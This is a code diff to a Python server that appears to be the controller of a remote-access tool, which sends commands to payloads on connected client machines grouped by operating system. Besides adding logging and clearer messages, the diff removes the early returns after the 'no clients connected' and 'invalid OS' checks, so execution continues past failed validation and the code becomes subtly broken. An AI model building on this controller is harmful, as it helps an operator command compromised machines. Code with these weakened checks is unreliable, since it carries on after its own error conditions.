@@ -3,6 +3,7 @@ import threading
 from typing import Tuple, Dict
 import sys
 from colorama import Fore
+import logging
 from modules.server_modules.RSAcryptography import cryptography_toolkit
 from modules.server_modules.logo import logo
 from modules.server_modules.help import help_message
@@ -103,7 +104,7 @@ The bytesize of the messages being sent between the server and client is 1024.
 
         # Obtain host information
         self.host_ip: str = socket.gethostbyname(socket.gethostname()) # Obtain host ip address
-        self.host_port: int = host_port 
+        self.host_port: int = host_port
 
         # Bytesize of messages being sent between the server and client
         self.bytesize: int = bytesize
@@ -199,7 +200,6 @@ The bytesize of the messages being sent between the server and client is 1024.
                     # Check if there is a client connected
                     if len(self.client_list.keys()) == 0:
                         print("No clients connected")
-                        return False
                     
                     # Display all OS 
                     print('All connected operating systems: ')
@@ -214,7 +214,6 @@ The bytesize of the messages being sent between the server and client is 1024.
                     # Ensure chosen_OS is valid
                     if chosen_OS not in self.OS_list.keys():
                         print('OS not being used by any connected clients ')
-                        return False
                     
                     # Send command to first payload on all clients using chosen_OS
                     for client_ip in self.client_list.keys():
@@ -228,7 +227,6 @@ The bytesize of the messages being sent between the server and client is 1024.
                     # Check if there is a client connected
                     if len(self.client_list.keys()) == 0:
                         print("No clients connected")
-                        return False
                     
                     # Display all OS 
                     print('All connected operating systems: ')
@@ -243,7 +241,6 @@ The bytesize of the messages being sent between the server and client is 1024.
                     # Ensure chosen_OS is valid
                     if chosen_OS not in self.OS_list.keys():
                         print('OS not being used by any connected clients ')
-                        return False
                     
                     # Send command to first payload on all clients using chosen_OS
                     for connection in self.OS_list[chosen_OS]:
@@ -337,8 +334,8 @@ The bytesize of the messages being sent between the server and client is 1024.
             self.send_command(command, client_ip)
             return True
         except Exception as e: # Error should not happen here
-            print(e)
-            return True # Should handle error gracefully anyway
+            logging.exception(f"Sending command failed:\n{e}") # Log error to console
+            return True # Error should be handled gracefully 
 
     # Function to check if user has input a CLI/server command
     def command_option(self, command: str) -> bool:
@@ -738,7 +735,7 @@ The bytesize of the messages being sent between the server and client is 1024.
 
             if self.command_option(client_ip) == False: # Check if user has input a server command
                 if client_ip not in self.client_list.keys(): # Check if client is connected
-                    print("ERROR: client ip is not connected to server")    
+                    print("ERROR: client ip is not connected to server\n(If you are attempting to send a command to clients, please choose a targeted client first)")    
                 else:
                     self.connected_client = client_ip
 
@@ -757,6 +754,7 @@ The bytesize of the messages being sent between the server and client is 1024.
         while True:
             # Ensure currently connected client is still connected to server
             if self.connected_client not in self.client_list.keys():
+                print(f'Currently connected client: {self.connected_client} has disconnected from the server')
                 self.startupCLI()
                 
             # Take user input and carry out the given CLI command or send commands to client
